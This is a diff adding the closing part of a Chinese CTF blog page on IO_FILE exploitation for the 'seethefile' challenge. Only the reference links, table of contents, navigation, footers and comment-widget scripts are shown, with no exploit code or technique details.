+<h3 id="推荐链接"><a href="#推荐链接" class="headerlink" title="推荐链接"></a>推荐链接</h3><p><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/" target="_blank" rel="external">https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/15/wireless/" rel="next" title="CTF | 基于软件无线电对无线世界的探索">
+                <i class="fa fa-chevron-left"></i> CTF | 基于软件无线电对无线世界的探索
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/03/XMAN-reversing-day2/" rel="prev" title="CTF | 逆向入门第二篇">
+                CTF | 逆向入门第二篇 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="yuuoniy" />
+            
+              <p class="site-author-name" itemprop="name">yuuoniy</p>
+              <p class="site-description motion-element" itemprop="description">世界本该是你醒来的模样</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">48</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/yuuoniy" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:linmq006@gmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#seethefile"><span class="nav-number">1.</span> <span class="nav-text">seethefile</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">1.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露地址"><span class="nav-number">1.2.1.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造-FILE"><span class="nav-number">1.2.2.</span> <span class="nav-text">构造 FILE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#推荐链接"><span class="nav-number">1.3.</span> <span class="nav-text">推荐链接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright">&copy; 2017 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yuuoniy</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="Symbols count total">113k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="Reading time total">1:43</span>
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.3.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.1</div>
+
+
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://yuuoniy.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://yuuoniy.github.io/2018/08/14/seethefile-writeup/';
+        this.page.identifier = '2018/08/14/seethefile-writeup/';
+        this.page.title = 'CTF | IO_FILE 相关利用';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://yuuoniy.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: true,
+        appId: 'VeQJNmfPOV9K2WFrArLoD0xN-gzGzoHsz',
+        appKey: 'TfDg8GxclLQKiTCGQ0hkV63P',
+        placeholder: '大佬有什么想法',
+        avatar:'retro',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
